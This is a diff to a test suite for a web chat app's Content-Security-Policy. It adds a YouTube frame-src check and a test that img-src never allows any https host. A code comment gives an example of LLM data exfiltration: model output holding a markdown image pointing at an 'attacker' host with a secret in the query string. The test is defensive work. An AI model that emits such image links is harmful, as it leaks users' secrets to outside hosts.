@@ -27,6 +27,10 @@ describe('Content-Security-Policy', () => {
     expect(directive('frame-src')).toContain("'self'");
   });
 
+  it('frames the ambient backdrop player, from the YouTube origin only', () => {
+    expect(directive('frame-src')).toContain('https://www.youtube.com');
+  });
+
   /**
    * hanzo.id answers `frame-ancestors 'none'` + `X-Frame-Options: DENY`, so it can
    * never be framed and chat no longer tries — the iframe `signinSilent()` flow is
@@ -39,5 +43,15 @@ describe('Content-Security-Policy', () => {
   it('never opens the door to any origin', () => {
     expect(contentSecurityPolicy).not.toContain('*;');
     expect(directive('connect-src')).not.toContain(' * ');
+  });
+
+  it('does not auto-load images from an arbitrary host — no beacon channel', () => {
+    // A bare `https:` in img-src is the LLM exfiltration channel: model output
+    // ![](https://attacker/p?d=<secret>) fires a GET on render. img-src must
+    // name specific hosts, never the whole scheme.
+    const img = directive('img-src') ?? '';
+    // The bare scheme is a standalone token; `https://s3.hanzo.ai` is not it.
+    expect(img.split(' ')).not.toContain('https:');
+    expect(img).toContain("'self'");
   });
 });
